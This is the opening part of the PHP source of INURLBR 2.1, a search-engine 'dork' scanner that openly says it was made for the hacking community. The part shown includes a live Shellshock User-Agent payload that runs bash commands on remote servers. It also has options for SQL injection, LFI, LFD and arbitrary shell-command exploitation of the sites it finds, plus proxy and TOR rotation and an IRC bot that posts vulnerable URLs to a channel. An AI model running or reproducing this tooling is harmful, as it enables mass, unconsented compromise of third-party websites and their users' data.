#!/usr/bin/php -q
<?php
/*

  +-----------------------------------------------------------------------------+
  |  [!] Legal disclaimer: Usage of INURLBR for attacking targets without prior |
  |  mutual consent is illegal.                                                 |
  |  It is the end user's responsibility to obey all applicable local, state and|
  |  federal laws.                                                              |
  |  Developers assume no liability and are not responsible for any misuse or   |
  |  damage caused by this program                                              |
  +-----------------------------------------------------------------------------+


  [+] AUTOR:        Cleiton Pinheiro / Nick: googleINURL
  [+] Blog:         http://blog.inurl.com.br
  [+] Twitter:      https://twitter.com/googleinurl
  [+] Fanpage:      https://fb.com/InurlBrasil
  [+] Pastebin      http://pastebin.com/u/Googleinurl
  [+] GIT:          https://github.com/googleinurl
  [+] PSS:          http://packetstormsecurity.com/user/googleinurl
  [+] EXA:          http://exploit4arab.net/author/248/Cleiton_Pinheiro
  [+] YOUTUBE:      http://youtube.com/c/INURLBrasil
  [+] PLUS:         http://google.com/+INURLBrasil

  [+] SCRIPT NAME: INURLBR 2.1
  INURLBR scanner was developed by Cleiton Pinheiro, owner and founder of INURL - BRASIL.
  Tool made ​​in PHP that can run on different Linux distributions helps
  hackers / security professionals in their specific searches.
  With several options are automated methods of exploration, AND SCANNER is
  known for its ease of use and performasse.
  The inspiration to create the inurlbr scanner, was the XROOT Scan 5.2 application.

  [+]  Long desription
  The INURLBR tool was developed aiming to meet the need of Hacking community.
  Purpose: Make advanced searches to find potential vulnerabilities in web
  applications known as Google Hacking with various options and search filters,
  this tool has an absurd power of search engines available with
  (24) + 6 engines special(deep web)

  - Possibility generate IP ranges or random_ip and analyze their targets.
  - Customization of  HTTP-HEADER, USER-AGET, URL-REFERENCE.
  - Execution external to exploit certain targets.
  - Generator dorks random or set file dork.
  - Option to set proxy, file proxy list, http proxy, file http proxy.
  - Set time random proxy.
  - It is possible to use TOR ip Random.
  - Debug processes urls, http request, process irc.
  - Server communication irc sending vulns urls for chat room.
  - Possibility injection exploit GET / POST => SQLI, LFI, LFD.
  - Filter and validation based regular expression.
  - Extraction of email and url.
  - Validation using http-code.
  - Search pages based on strings file.
  - Exploits commands manager.
  - Paging limiter on search engines.
  - Beep sound when trigger vulnerability note.
  - Use text file as a data source for urls tests.
  - Find personalized strings in return values of the tests.
  - Validation vulnerability shellshock.
  - File validation values wordpress wp-config.php.
  - Execution sub validation processes.
  - Validation syntax errors database and programmin.
  - Data encryption as native parameter.
  - Random google host.
  - Scan port.
  - Error Checking & values​​:
  [*]JAVA INFINITYDB, [*]LOCAL FILE INCLUSION, [*]ZIMBRA MAIL,           [*]ZEND FRAMEWORK,
  [*]ERROR MARIADB,   [*]ERROR MYSQL,          [*]ERROR JBOSSWEB,        [*]ERROR MICROSOFT,
  [*]ERROR ODBC,      [*]ERROR POSTGRESQL,     [*]ERROR JAVA INFINITYDB, [*]ERROR PHP,
  [*]CMS WORDPRESS,   [*]SHELL WEB,            [*]ERROR JDBC,            [*]ERROR ASP,
  [*]ERROR ORACLE,    [*]ERROR DB2,            [*]JDBC CFM,              [*]ERROS LUA,
  [*]ERROR INDEFINITE

  [+] Dependencies - (PHP 5.4.*):
  sudo apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl


  [+] Play LIST TUTORIAL:
  https://www.youtube.com/watch?v=jwjZUsgf9xM&list=PLV1376pVwcCmcoCmq_Z4O0ra4BqjmhIaR


  +--------------------------------------------------------------------------------------+
  |  |  |                            G R 3 3 T S                                   |  |  |
  +--------------------------------------------------------------------------------------+
 * r00t-3xp10t, Jh00n, chk_,  Unknownantisec,  sl4y3r 0wn3r, hc0d3r, arplhmd, 0x4h4x
 * Clandestine, KoubackTr, SnakeTomahawk, SkyRedFild, Lorenzo Faletra, Eclipse, shaxer   
 * dd3str0y3r, Johnny Deep, Lenon Leite, pSico_b0y, Bakunim_Malvadão, IceKiller, c00z  
 * Oystex, rH, Warflop, se4b3ar 

 */

error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '256M');
ini_set('display_errors', 0);
ini_set('max_execution_time', 0);
ini_set('allow_url_fopen', 1);
(!isset($_SESSION) ? session_start() : NULL);
__OS();


/*
  [+]Capturing TERMINAL VALUES.
  (PHP 4 >= 4.3.0, PHP 5)getopt - Gets options from the command line argument list
  http://php.net/manual/pt_BR/function.getopt.php */
$commandos_list = array(
    'dork:', 'dork-file:', 'exploit-cad:', 'range:', 'range-rand:', 'irc:',
    'exploit-all-id:', 'exploit-vul-id:', 'exploit-get:', 'exploit-post:',
    'regexp-filter:', 'exploit-command:', 'command-all:', 'command-vul:',
    'replace:', 'remove:', 'regexp:', 'sall:', 'sub-file:', 'sub-get::', 'sub-concat:',
    'user-agent:', 'url-reference:', 'delay:', 'sendmail:', 'time-out:',
    'http-header:', 'ifcode:', 'ifurl:', 'ifemail:', 'mp:', 'target:',
    'no-banner::', 'gc::', 'proxy:', 'proxy-file:', 'time-proxy:', 'pr::',
    'proxy-http-file:', 'update::', 'info::', 'help::', 'unique::', 'popup::',
    'ajuda::', 'install-dependence::', 'cms-check::', 'sub-post::', 'robots::',
    'alexa-rank::', 'beep::', 'exploit-list::', 'tor-random::', 'shellshock::',
    'dork-rand:', 'sub-cmd-all:', 'sub-cmd-vul:', 'port-cmd:', 'port-scan:',
    'port-write:', 'ifredirect:', 'persist:', 'file-cookie:', 'save-as:'
);

$opcoes = getopt('u::a:d:o:p:s:q:t:m::h::', $commandos_list);


/*
  [+]VERIFYING LIB php5-curl IS INSTALLED.
  (PHP 4, PHP 5) function_exists — Return TRUE if the given function has been
  defined.
  http://php.net/manual/en/function.function-exists.php

  [+]Verification - CURL_EXEC
  Execute the given cURL session.
  This function should be called after initializing a cURL session and all the
  options for the session are set.
  http://php.net/manual/en/function.curl-exec.php */
(!function_exists('curl_exec') ? __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]} INSTALLING THE LIBRARY php5-curl ex: php5-curl apt-get install{$_SESSION["c0"]}\n") : NULL );

/*
  [+]VERIFYING use Input PHP CLI.
  (PHP 4, PHP 5) defined — Checks whether a given named constant exists
  http://php.net/manual/pt_BR/function.defined.php */
(!defined('STDIN') ? __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]} Please run it through command-line!{$_SESSION["c0"]}\n") : NULL);


#[+]Resetting VALUES $ _SESSION ['config']
$_SESSION['config'] = array();
$_SESSION['config']['version_script'] = '2.1';
$_SESSION['config']['totas_urls'] = NULL;
$_SESSION['config']["contUrl"] = 0;
$_SESSION['config']['cont_email'] = 0;
$_SESSION['config']['cont_url'] = 0;
$_SESSION['config']['cont_valores'] = 0;

#[+] FILE MANAGEMENT EXPLOITS.
$_SESSION['config']['file_exploit_conf'] = 'exploits.conf';

#[+] FOLDER WHERE WILL BE SAVED PROCESSES.
$_SESSION['config']['out_put_paste'] = 'output/';

/*
  [+]USER-AGENT EXPLOIT SHELLSHOCK
  (CVE-2014-6271, CVE-2014-6277,
  CVE-2014-6278, CVE-2014-7169,
  CVE-2014-7186, CVE-2014-7187)
  is a vulnerability in GNU's bash shell that gives attackers access to run remote
  commands on a vulnerable system. */
$_SESSION['config']['user_agent_xpl'] = "() { foo;};echo; /bin/bash -c \"expr 299663299665 / 3; echo CMD:;id; echo END_CMD:;\"";

#[+]BLACK LIST URL-STRINGS
$_SESSION['config']['blacklist'] = "//t.co,google.,youtube.,jsuol.com,.radio.uol.,b.uol.,barra.uol.,whowhere.,hotbot.,amesville.,lycos,lygo.,orkut.,schema.,blogger.,bing.,w3.,yahoo.,yimg.,creativecommons.org,ndj6p3asftxboa7j.,.torproject.org,.lygo.com,.apache.org,.hostname.,document.,";
$_SESSION['config']['blacklist'].= "live.,microsoft.,ask.,shifen.com,answers.,analytics.,googleadservices.,sapo.pt,favicon.,blogspot.,wordpress.,.css,scripts.js,jquery-1.,dmoz.,gigablast.,aol.,.macromedia.com,.sitepoint.,yandex.,www.tor2web.org,.securityfocus.com,.Bootstrap.,.metasploit.com,";
$_SESSION['config']['blacklist'].= "aolcdn.,altavista.,clusty.,teoma.,baiducontent.com,wisenut.,a9.,uolhost.,w3schools.,msn.,baidu.,hao123.,shifen.,procog.,facebook.,twitter.,flickr.,.adobe.com,oficinadanet.,elephantjmjqepsw.,.shodan.io,kbhpodhnfxl3clb4,.scanalert.com,.prototype.,feedback.core,";
$_SESSION['config']['blacklist'].= "4shared.,.KeyCodeTab,.style.,www/cache/i1,.className.,=n.,a.Ke=,Y.config,.goodsearch.com,style.top,n.Img,n.canvas.,t.search,Y.Search.,a.href,a.currentStyle,a.style,yastatic.,.oth.net,.hotbot.com,.zhongsou.com,ezilon.com,.example.com,location.href,.navigation.,";
$_SESSION['config']['blacklist'].= ".bingj.com,Y.Mobile.,srpcache?p,stackoverflow.,shifen.,baidu.,baiducontent.,gstatic.,php.net,wikipedia.,webcache.,inurl.,naver.,navercorp.,windows.,window.,.devmedia,imasters.,.inspcloud.com,.lycos.com,.scorecardresearch.com,.target.,JQuery.min,Element.location.,";
$_SESSION['config']['blacklist'].= "exploit-db,packetstormsecurity.,1337day,owasp,.sun.com,mobile10.dtd,onabort=function,inurl.com.br,purl.org,.dartsearch.net,r.cb,.classList.,.pt_BR.,github,microsofttranslator.com,.compete.com,.sogou.com,gmail.,blackle.com,boorow.com,gravatar.com,sourceforge.,.mozilla.org";

$_SESSION['config']['line'] = "\n{$_SESSION["c1"]} _[ - ]{$_SESSION["c7"]}::{$_SESSION["c1"]}--------------------------------------------------------------------------------------------------------------{$_SESSION["c0"]}";

#[+]PRINTING HELP / INFO
(isset($opcoes['h']) || isset($opcoes['help']) || isset($opcoes['ajuda']) ? __menu() : NULL);
(isset($opcoes['info']) ? __info() : NULL);

#[+]PRINTING EXPLOITS LIST.
(isset($opcoes['exploit-list']) ? print(__bannerLogo()) . __configExploitsList(1)  : NULL);

#[+]CREATING DEFAULT SETTINGS EXIT RESULTS.
(!is_dir($_SESSION['config']['out_put_paste']) ? mkdir($_SESSION['config']['out_put_paste'], 0777, TRUE) : NULL);

#[+]CREATING DEFAULT SETTINGS MANAGEMENT EXPLOITS.
(!file_exists($_SESSION['config']['file_exploit_conf']) ? touch($_SESSION['config']['file_exploit_conf']) : NULL);

#[+]Deletes FILE cookie STANDARD.
(file_exists('cookie.txt') ? unlink('cookie.txt') : NULL);

#[+]REGISTRATION NEW COMMAND EXPLOIT
(not_isnull_empty($opcoes['exploit-cad']) ? __configExploitsADD($opcoes['exploit-cad']) : NULL);

#[+]Dependencies installation
(isset($opcoes['install-dependence']) ? __installDepencia() : NULL);

#[+]UPDATE SCRIPT
(isset($opcoes['update']) ? __update() : NULL);

################################################################################
#CAPTURE OPTIONS################################################################
################################################################################
#[+]VALIDATION SEARCH METHODS / (DORK,RANGE-IP)
if (not_isnull_empty($opcoes['o'])) {

    $_SESSION['config']['abrir-arquivo'] = $opcoes['o'];
} else if (!not_isnull_empty($opcoes['o']) &&
        !not_isnull_empty($opcoes['range']) &&
        !not_isnull_empty($opcoes['range-rand']) &&
        !not_isnull_empty($opcoes['dork-rand'])) {

    $_SESSION['config']['dork'] = not_isnull_empty($opcoes['dork']) && is_null($_SESSION['config']['abrir-arquivo']) ? $opcoes['dork'] : NULL;
    $_SESSION['config']['dork-file'] = not_isnull_empty($opcoes['dork-file']) && is_null($_SESSION['config']['abrir-arquivo']) ? $opcoes['dork-file'] : NULL;
    (!not_isnull_empty($_SESSION['config']['dork']) && !not_isnull_empty($_SESSION['config']['dork-file']) ? __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]}DEFINE DORK ex: --dork '.asp?CategoryID=' OR --dork-file 'dorks.txt'{$_SESSION["c0"]}\n") : NULL);
}

#[+]VALIDATION GENERATE DORKS RANDOM
$_SESSION['config']['dork-rand'] = not_isnull_empty($opcoes['dork-rand']) ? $opcoes['dork-rand'] : NULL;

#[+]VALIDATION TARGET FIND PAGE
$_SESSION['config']['target'] = not_isnull_empty($opcoes['target']) && !isset($_SESSION['config']['dork']) ? $opcoes['target'] : NULL;

#[+]VALIDATION URL EXTRACTION
$_SESSION['config']['extrai-url'] = isset($opcoes['u']) ? TRUE : NULL;

#[+]VALIDATION EMAIL EXTRACTION
$_SESSION['config']['extrai-email'] = isset($opcoes['m']) ? TRUE : NULL;

#[+]VALIDATION ID SEARCH ENGINE
$_SESSION['config']['motor'] = not_isnull_empty($opcoes['q']) &&
        __validateOptions('1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,e1,e2,e3,e4,e5,e6,all', $opcoes['q']) ? $opcoes['q'] : 1;

#[+]VALIDATION SAVE FILE VULNERABLE
!not_isnull_empty($opcoes['s']) && !not_isnull_empty($opcoes['save-as']) && empty($opcoes['sall']) ?
                __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]}DEFINE FILE SAVE OUTPUT ex: -s , --save-as , --sall filevull.txt{$_SESSION["c0"]}\n") : NULL;

$_SESSION['config']['s'] = not_isnull_empty($opcoes['s']) ? $opcoes['s'] : null;

$_SESSION['config']['save-as'] = not_isnull_empty($opcoes['save-as']) ? $opcoes['save-as'] : null;

$_SESSION['config']['arquivo_output'] = not_isnull_empty($_SESSION['config']['s']) ? $_SESSION['config']['s'] : $opcoes['save-as'];

#[+]VALIDATION SAVE FILE ALL VALORES
$_SESSION['config']['arquivo_output_all'] = not_isnull_empty($opcoes['sall']) ? $opcoes['sall'] : NULL;

#[+]VALIDATION TYPE ERROR
$_SESSION['config']['tipoerro'] = not_isnull_empty($opcoes['t']) && __validateOptions('1,2,3,4,5', $opcoes['t']) ? $opcoes['t'] : 1;

#[+]VALIDATION REPLACEMENT VALUES
$_SESSION['config']['replace'] = not_isnull_empty($opcoes['replace']) ? $opcoes['replace'] : NULL;

#[+]VALIDATION SET PROXY
$_SESSION['config']['proxy'] = not_isnull_empty($opcoes['proxy']) ? $opcoes['proxy'] : NULL;

#[+]VALIDATION SET FILE WITH LIST OF PROXY
$_SESSION['config']['proxy-file'] = not_isnull_empty($opcoes['proxy-file']) ? $opcoes['proxy-file'] : NULL;

#[+]VALIDATION SET HTTP->PROXY
$_SESSION['config']['proxy-http'] = not_isnull_empty($opcoes['proxy-http']) ? $opcoes['proxy-http'] : NULL;

#[+]VALIDATION SET FILE WITH LIST OF HTTP->PROXY
$_SESSION['config']['proxy-http-file'] = not_isnull_empty($opcoes['proxy-http-file']) ? $opcoes['proxy-http-file'] : NULL;

#[+]VALIDATION SET EXPLOIT VIA REQUEST GET
$_SESSION['config']['exploit-get'] = not_isnull_empty($opcoes['exploit-get']) ? str_replace(' ', '%20', $opcoes['exploit-get']) : NULL;

#[+]VALIDATION SET EXPLOIT VIA REQUEST POST
$_SESSION['config']['exploit-post'] = not_isnull_empty($opcoes['exploit-post']) ? __convertUrlQuery($opcoes['exploit-post']) : NULL;
$_SESSION['config']['exploit-post_str'] = not_isnull_empty($opcoes['exploit-post']) ? $opcoes['exploit-post'] : NULL;

#[+]VALIDATION COMMAND SHELL STRING COMPLEMENTARY
$_SESSION['config']['exploit-command'] = not_isnull_empty($opcoes['exploit-command']) ? $opcoes['exploit-command'] : NULL;

#[+]VALIDATION MANAGEMENT COMMANDS SHELL TARGET VULN ID
$_SESSION['config']['exploit-vul-id'] = not_isnull_empty($opcoes['exploit-vul-id']) ? $opcoes['exploit-vul-id'] : NULL;

#[+]VALIDATION MANAGEMENT COMMANDS SHELL ALL TARGET ID
$_SESSION['config']['exploit-all-id'] = not_isnull_empty($opcoes['exploit-all-id']) ? $opcoes['exploit-all-id'] : NULL;

#[+]VALIDATION SET COMMANDS SHELL EXECUTE TARGET VULN
$_SESSION['config']['command-vul'] = not_isnull_empty($opcoes['command-vul']) ? $opcoes['command-vul'] : NULL;

#[+]VALIDATION SET COMMANDS SHELL EXECUTE ALL TARGET
$_SESSION['config']['command-all'] = not_isnull_empty($opcoes['command-all']) ? $opcoes['command-all'] : NULL;

#[+]VALIDATION ADDITIONAL TYPE OF PARAMETER ERROR
$_SESSION['config']['achar'] = not_isnull_empty($opcoes['a']) ? $opcoes['a'] : NULL;

#[+]VALIDATION DEBUG NIVEL
$_SESSION['config']['debug'] = not_isnull_empty($opcoes['d']) && __validateOptions('1,2,3,4,5,6', $opcoes['d']) ? $opcoes['d'] : NULL;

#[+]VALIDATION INTERNAL
$_SESSION['config']['verifica_info'] = (__validateOptions($opcoes['d'], 6)) ? 1 : NULL;

#[+]VALIDATION ADDITIONAL PARAMETER PROXY
$_SESSION['config']['tor-random'] = isset($opcoes['tor-random']) && !is_null($_SESSION["config"]["proxy"]) ? TRUE : NULL;

#[+]VALIDATION CHECK VALUES CMS
$_SESSION['config']['cms-check'] = isset($opcoes['cms-check']) ? TRUE : NULL;

#[+]VALIDATION CHECK LINKS WEBCACHE GOOGLE
$_SESSION['config']['webcache'] = isset($opcoes['gc']) ? TRUE : NULL;

#[+]VALIDATION REGULAR EXPRESSION
$_SESSION['config']['regexp'] = not_isnull_empty($opcoes['regexp']) ? $opcoes['regexp'] : NULL;

#[+]VALIDATION FILTER BY REGULAR EXPRESSION
$_SESSION['config']['regexp-filter'] = not_isnull_empty($opcoes['regexp-filter']) ? $opcoes['regexp-filter'] : NULL;

#[+]VALIDATION NO BANNER SCRIPT
$_SESSION['config']['no-banner'] = isset($opcoes['no-banner']) ? TRUE : NULL;

#[+]VALIDATION SET USER-AGENT REQUEST
$_SESSION['config']['user-agent'] = not_isnull_empty($opcoes['user-agent']) ? $opcoes['user-agent'] : NULL;

#[+]VALIDATION SET URL-REFERENCE REQUEST
$_SESSION['config']['url-reference'] = not_isnull_empty($opcoes['url-reference']) ? $opcoes['url-reference'] : NULL;

#[+]VALIDATION PAGING THE MAXIMUM SEARCH ENGINE
$_SESSION['config']['max_pag'] = not_isnull_empty($opcoes['mp']) ? $opcoes['mp'] : NULL;

#[+]VALIDATION DELAY SET PAGING AND PROCESSES
$_SESSION['config']['delay'] = not_isnull_empty($opcoes['delay']) ? $opcoes['delay'] : NULL;

#[+]VALIDATION SET TIME OUT REQUEST
$_SESSION['config']['time-out'] = not_isnull_empty($opcoes['time-out']) ? $opcoes['time-out'] : NULL;

#[+]VALIDATION CODE HTTP
$_SESSION['config']['ifcode'] = not_isnull_empty($opcoes['ifcode']) ? $opcoes['ifcode'] : NULL;

#[+]VALIDATION STRING URL
$_SESSION['config']['ifurl'] = not_isnull_empty($opcoes['ifurl']) ? $opcoes['ifurl'] : NULL;

#[+]VALIDATION SET HTTP HEADER
$_SESSION['config']['http-header'] = not_isnull_empty($opcoes['http-header']) ? $opcoes['http-header'] : NULL;

#[+]VALIDATION SET FILE SUB_PROCESS
$_SESSION['config']['sub-file'] = not_isnull_empty($opcoes['sub-file']) ? __openFile($opcoes['sub-file'], 1) : NULL;

#[+]VALIDATION SUB_PROCESS TYPE REQUEST POST
$_SESSION['config']['sub-post'] = isset($opcoes['sub-post']) ? TRUE : NULL;

#[+]VALIDATION SUB_PROCESS TYPE REQUEST GET
$_SESSION['config']['sub-get'] = isset($opcoes['sub-get']) ? TRUE : NULL;

#[+]VALIDATION SEND VULN EMAIL
$_SESSION['config']['sendmail'] = not_isnull_empty($opcoes['sendmail']) ? $opcoes['sendmail'] : NULL;

#[+]VALIDATION SHOW RANK ALEXA
$_SESSION['config']['alexa-rank'] = isset($opcoes['alexa-rank']) ? TRUE : NULL;

#[+]VALIDATION ACTIVATE BEEP WHEN APPEAR VULNERABLE
$_SESSION['config']['beep'] = isset($opcoes['beep']) ? TRUE : NULL;

#[+]VALIDATION OF SINGLE DOMAIN FILTER 
$_SESSION['config']['unique'] = isset($opcoes['unique']) ? TRUE : NULL;

#[+]VALIDATION IRC SERVER/CHANNEL SEND VULN
$_SESSION['config']['irc']['conf'] = not_isnull_empty($opcoes['irc']) && strstr($opcoes['irc'], '#') ? explode("#", $opcoes['irc']) : NULL;

#[+]VALIDATION RANGE IP
$_SESSION['config']['range'] = not_isnull_empty($opcoes['range']) && strstr($opcoes['range'], ',') ? $opcoes['range'] : NULL;

#[+]VALIDATION QUANTITY RANGE IP RANDOM
$_SESSION['config']['range-rand'] = not_isnull_empty($opcoes['range-rand']) ? $opcoes['range-rand'] : NULL;

#[+]VALIDATION REMOVE STRING URL
$_SESSION['config']['remove'] = not_isnull_empty($opcoes['remove']) ? $opcoes['remove'] : NULL;

#[+]VALIDATION ACCESS FILE ROBOTS
$_SESSION['config']['robots'] = isset($opcoes['robots']) ? TRUE : NULL;

#[+]VALIDATION FILTER EMAIL STRING
$_SESSION['config']['ifemail'] = not_isnull_empty($opcoes['ifemail']) ? $opcoes['ifemail'] : NULL;

#[+]VALIDATION OPEN WINDOW CONSOLE PROCESS
$_SESSION['config']['popup'] = isset($opcoes['popup']) ? TRUE : NULL;

#[+]VALIDATION ACTIVATE SHELLSHOCK
$_SESSION['config']['shellshock'] = isset($opcoes['shellshock']) ? TRUE : NULL;

#[+]VALIDATION METHOD OF BUSTA PROGRESSIVE
$_SESSION['config']['pr'] = isset($opcoes['pr']) ? TRUE : NULL;

#[+]VALIDATION SET SUB-COMMANDS SHELL EXECUTE ALL TARGET
$_SESSION['config']['sub-cmd-all'] = isset($opcoes['sub-cmd-all']) ? TRUE : NULL;

#[+]VALIDATION SET SUB-COMMANDS SHELL EXECUTE TARGET VULN
$_SESSION['config']['sub-cmd-vul'] = isset($opcoes['sub-cmd-vul']) ? TRUE : NULL;

#[+]VALIDATION SET POR VALIDATION
$_SESSION['config']['port-cmd'] = not_isnull_empty($opcoes['port-cmd']) ? $opcoes['port-cmd'] : NULL;

#[+]VALIDATION SET SCAN PORT
$_SESSION['config']['port-scan'] = not_isnull_empty($opcoes['port-scan']) ? $opcoes['port-scan'] : NULL;

#[+]VALIDATION SET PAYLOAD XPL PORT
$_SESSION['config']['port-write'] = not_isnull_empty($opcoes['port-write']) ? $opcoes['port-write'] : NULL;

#[+]VALIDATION SET URL REDIRECT HEADER
$_SESSION['config']['ifredirect'] = not_isnull_empty($opcoes['ifredirect']) ? $opcoes['ifredirect'] : NULL;

#[+]VALIDATION SET URL REDIRECT HEADER
$_SESSION['config']['persist'] = not_isnull_empty($opcoes['persist']) ? $opcoes['persist'] : 4;

#[+]VALIDATION SET FILE COOKIE
$_SESSION['config']['file-cookie'] = not_isnull_empty($opcoes['file-cookie']) ? $opcoes['file-cookie'] : NULL;

#[+]VALIDATION SET STRING CONCAT URL SUB-PROCESS
$_SESSION['config']['sub-concat'] = not_isnull_empty($opcoes['sub-concat']) ? $opcoes['sub-concat'] : NULL;

################################################################################
#IRC CONFIGURATION##############################################################
################################################################################

if (is_array($_SESSION['config']['irc']['conf'])) {

    $alph = range("A", "Z");
    $_ = array(0 => rand(0, 10000), 1 => $alph[rand(0, count($alph))]);
    $_SESSION['config']['irc']['my_pid'] = 0;
    $_SESSION['config']['irc']['irc_server'] = $_SESSION['config']['irc']['conf'][0];
    $_SESSION['config']['irc']['irc_channel'] = "#{$_SESSION['config']['irc']['conf'][1]}";
    $_SESSION['config']['irc']['irc_port'] = 6667;
    $_SESSION['config']['irc']['localhost'] = "127.0.0.1 localhost";
    $_SESSION['config']['irc']['irc_nick'] = "[BOT]1nurl{$_[0]}[{$_[1]}]";
    $_SESSION['config']['irc']['irc_realname'] = "B0t_1NURLBR";
    $_SESSION['config']['irc']['irc_quiet'] = "Session Ended";
    global $conf;
} elseif (!is_array($_SESSION['config']['irc']['conf']) && not_isnull_empty($opcoes['irc'])) {

    __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]}IRC WRONG FORMAT! ex: --irc 'irc.rizon.net#inurlbrasil' {$_SESSION["c0"]}\n");
}

################################################################################
#IRC CONECTION##################################################################
################################################################################

function __ircConect($conf) {

    $fp = fsockopen($conf['irc_server'], $conf['irc_port'], $conf['errno'], $conf['errstr'], 30);
    if (!$fp) {

        echo "Error: {$conf['errstr']}({$conf['errno']})\n";
        return NULL;
    }
    $u = php_uname();
    fwrite($fp, "NICK {$conf['irc_nick']}\r\n");
    fwrite($fp, "USER {$conf['irc_nick']} 8 * :{$conf['irc_realname']}\r\n");
    fwrite($fp, "JOIN {$conf['irc_channel']}\r\n");
    fwrite($fp, "PRIVMSG {$conf['irc_channel']} :[ SERVER ] {$u}\r\n");
    return $fp;
}

################################################################################
#IRC SEND MSG###################################################################
################################################################################

function __ircMsg($conf, $msg) {

    fwrite($conf['irc_connection'], "PRIVMSG ${conf['irc_channel']} :${msg}\r\n") . sleep(2);
    __plus();
}

################################################################################
#IRC PING PONG##################################################################
################################################################################

function __ircPong($conf) {

    while (!feof($conf['irc_connection'])) {

        $conf['READ_BUFFER'] = fgets($conf['irc_connection']);
        __plus();
        if (preg_match("/^PING(.+)/", $conf['READ_BUFFER'], $conf['ret'])) {

            __debug(array('debug' => "[ PING-PONG ]{$conf['ret'][1]}", 'function' => '__ircPong'), 6) . __plus();
            fwrite($conf['READ_BUFFER'], "PONG {$conf['ret'][1]}\r\n");
            ($_SESSION['config']['debug'] == 6) ?
                            fwrite($conf['irc_connection'], "PRIVMSG ${conf['irc_channel']} :[ PING-PONG ]-> {$conf['ret'][1]}->function:__ircPong\r\n") : NULL;
        }
    }
}

################################################################################
#IRC QUIT#######################################################################
################################################################################

function __ircQuit($conf) {

    fwrite($conf['irc_connection'], "QUIT {$conf['irc_quiet']}\r\n") . sleep(2);
    __plus();
    fclose($conf['irc_connection']);
}

#END IRC########################################################################
#UPDATE SCRIPT##################################################################
################################################################################

function __update() {

    echo __bannerLogo();

    echo "{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}WANT TO MAKE UPDATE SCRIPT\n{$_SESSION["c0"]}";
    echo "{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}This can modify the current script\n{$_SESSION["c0"]}";
    echo "{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}ARE YOU SURE ? (y \ n): {$_SESSION["c0"]}";

    if (trim(fgets(STDIN)) == 'y') {

        $resultado = __request_info("https://raw.githubusercontent.com/googleinurl/SCANNER-INURLBR/master/inurlbr.php", $_SESSION["config"]["proxy"], NULL);

        if (not_isnull_empty($resultado['corpo'])) {

            unlink('inurlbr.php');
            $varf = fopen('inurlbr.php', 'a');
            fwrite($varf, $resultado['corpo']);
            fclose($varf);
            chmod('inurlbr.php', 0777);
            echo "\nUPDATE DONE WITH SUCCESS!\n";
            sleep(3);
            system("chmod +x inurlbr.php | php inurlbr.php");
            exit();
        } else {

            echo system("command clear") . __bannerLogo();
            echo "{$_SESSION["c1"]}__[ x ] {$_SESSION["c16"]}FAILURE TO SERVER!\n{$_SESSION["c0"]}";
        }
    }
}

################################################################################
#SECURITIES VALIDATION DOUBLE#####################################################
################################################################################

function not_isnull_empty($valor = NULL) {

    RETURN !is_null($valor) && !empty($valor) ? TRUE : FALSE;
}

################################################################################
#MENU###########################################################################
################################################################################

function __menu() {

    return system("command clear") . __getOut(__extra() . "        
 {$_SESSION["c1"]}_    _ ______ _      _____  
| |  | |  ____| |    |  __ \
| |__| | |__  | |    | |__) |
|  __  |  __| | |    |  ___/
| |  | | |____| |____| |    
|_|  |_|______|______|_|

{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Current PHP version=>[ {$_SESSION["c1"]}" . phpversion() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Current script owner=>[ {$_SESSION["c1"]}" . get_current_user() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Current uname=>[ {$_SESSION["c1"]}" . php_uname() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Current pwd =>[ {$_SESSION["c1"]}" . getcwd() . "{$_SESSION["c0"]} ]
" . $_SESSION['config']['line'] . "
    
{$_SESSION["c1"]}-h{$_SESSION["c0"]}
{$_SESSION["c1"]}--help{$_SESSION["c0"]}   Alternative long length help command.
{$_SESSION["c1"]}--ajuda{$_SESSION["c0"]}  Command to specify Help.
{$_SESSION["c1"]}--info{$_SESSION["c0"]}   Information script.
{$_SESSION["c1"]}--update{$_SESSION["c0"]} Code update.    
{$_SESSION["c1"]}-q{$_SESSION["c0"]}       Choose which search engine you want through [{$_SESSION["c2"]}1...24{$_SESSION["c0"]}] / [{$_SESSION["c2"]}e1..6{$_SESSION["c0"]}]]:
     [options]:
     {$_SESSION["c1"]}1{$_SESSION["c0"]}   - {$_SESSION["c2"]}GOOGLE / (CSE) GENERIC RANDOM / API
     {$_SESSION["c1"]}2{$_SESSION["c0"]}   - {$_SESSION["c2"]}BING
     {$_SESSION["c1"]}3{$_SESSION["c0"]}   - {$_SESSION["c2"]}YAHOO BR
     {$_SESSION["c1"]}4{$_SESSION["c0"]}   - {$_SESSION["c2"]}ASK
     {$_SESSION["c1"]}5{$_SESSION["c0"]}   - {$_SESSION["c2"]}HAO123 BR
     {$_SESSION["c1"]}6{$_SESSION["c0"]}   - {$_SESSION["c2"]}GOOGLE (API)
     {$_SESSION["c1"]}7{$_SESSION["c0"]}   - {$_SESSION["c2"]}LYCOS
     {$_SESSION["c1"]}8{$_SESSION["c0"]}   - {$_SESSION["c2"]}UOL BR
     {$_SESSION["c1"]}9{$_SESSION["c0"]}   - {$_SESSION["c2"]}YAHOO US
     {$_SESSION["c1"]}10{$_SESSION["c0"]}  - {$_SESSION["c2"]}SAPO
     {$_SESSION["c1"]}11{$_SESSION["c0"]}  - {$_SESSION["c2"]}DMOZ
